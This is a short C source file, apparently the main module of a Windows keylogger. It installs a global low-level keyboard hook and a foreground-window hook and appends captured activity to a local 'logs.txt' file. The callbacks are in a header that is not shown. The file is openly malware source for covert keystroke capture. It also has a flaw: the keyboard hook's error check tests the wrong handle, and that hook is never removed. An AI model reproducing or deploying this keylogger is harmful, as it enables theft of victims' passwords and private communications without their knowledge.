#include "keyloger.h"


int	errorReturn(char *log)
{
	printf("Error: %s | %lu\n", log, GetLastError());
	return EXIT_FAILURE;
}

int	initfd(char *fileName)
{
	fd = CreateFileA(fileName, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		
	if (fd != INVALID_HANDLE_VALUE)
		SetFilePointer(fd, 0, NULL, FILE_END);
	else
		return EXIT_FAILURE;
	
	return EXIT_SUCCESS;
}


int	main(void)
{
	// Init log file descriptor
	if (initfd("logs.txt") == EXIT_FAILURE)
		return errorReturn("Failed to set log.txt file FD");

	HWINEVENTHOOK hookFG = SetWinEventHook(
		EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
		NULL,
		WinForeground,
		0, 0,
		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
	if (hookFG == NULL)
		return errorReturn("Failed to set hook Foreground");

	HHOOK hookKB = SetWindowsHookExW(
		WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0
	);
	if (hookFG == NULL)
		return errorReturn("Failed to set hook Keyboard");

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
		;
	UnhookWinEvent(hookFG);
	CloseHandle(fd);
}

